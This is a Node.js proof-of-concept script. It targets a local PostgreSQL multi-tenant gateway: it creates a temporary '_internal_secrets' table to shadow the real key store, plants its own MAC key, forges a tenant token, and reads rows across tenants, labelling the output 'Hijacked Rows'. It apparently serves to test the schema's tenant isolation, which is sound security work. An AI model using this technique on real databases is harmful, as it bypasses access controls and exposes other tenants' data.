const { Pool } = require('pg');
const pool = new Pool({ user: 'u0_a338', host: '127.0.0.1', database: 'postgres', port: 5432 });

async function run() {
    const client = await pool.connect();
    try {
        await client.query("INSERT INTO requests (tenant_id, target_tool, idempotency_key, request_fingerprint, payload) VALUES ('00000000-0000-0000-0000-000000000001', 'toolA', 'k', 'hash', '{}') ON CONFLICT DO NOTHING");
        
        await client.query("SET ROLE gateway_role");
        await client.query("CREATE TEMP TABLE _internal_secrets (key TEXT PRIMARY KEY, value TEXT NOT NULL)");
        await client.query("INSERT INTO _internal_secrets VALUES ('tenant_mac_key', 'attacker_secret')");
        
        const crypto = require('crypto');
        const sig = crypto.createHmac('sha256', 'attacker_secret').update('00000000-0000-0000-0000-000000000001').digest('hex');
        const token = `00000000-0000-0000-0000-000000000001.${sig}`;
        
        await client.query(`SET app.tenant_token = '${token}'`);
        
        const res = await client.query("SELECT count(*) FROM requests");
        console.log("Hijacked Rows:", res.rows[0].count);
    } catch(e) {
        console.log("Error:", e.message);
    } finally {
        client.release();
        pool.end();
    }
}
run();
